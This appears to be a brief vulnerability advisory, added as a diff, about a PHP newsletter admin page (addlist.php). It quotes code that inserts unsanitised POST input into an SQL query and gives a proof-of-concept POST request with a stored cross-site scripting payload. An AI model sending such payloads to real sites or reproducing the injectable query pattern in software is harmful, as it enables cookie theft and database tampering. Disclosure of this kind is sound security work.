@@ -1,0 +1,34 @@
+#################################################################
+#
+# Tested On: Windows Vista
+# Note: For educational purposes only
+#
+#################################################################
+
+There’s probably a lot more vulnerabilities in their web apps, but 
+I could not even get them to work out of the box..
+
+http://server/newsletter/admin/addlist.php
+Look no sanitization:
+
+8<-------snip---------8<
+
+if(isset($_POST['submit'])) 
+   {
+     $list=$_POST['list'];
+     if(strlen($list)<1)
+     {
+       print "You did not enter the name of the email list.";
+     }
+     else
+     {
+       $addemail="Insert into m_newsletters(newslettername) values('$list')";
+       mysql_query($addemail) or die("Could not add list");
+       print "List added.";
+
+     }
+
+8<-------snip---------8<
+
+POC POST request:
+list=<script>alert('i could get your cookie')</script>&submit=submit
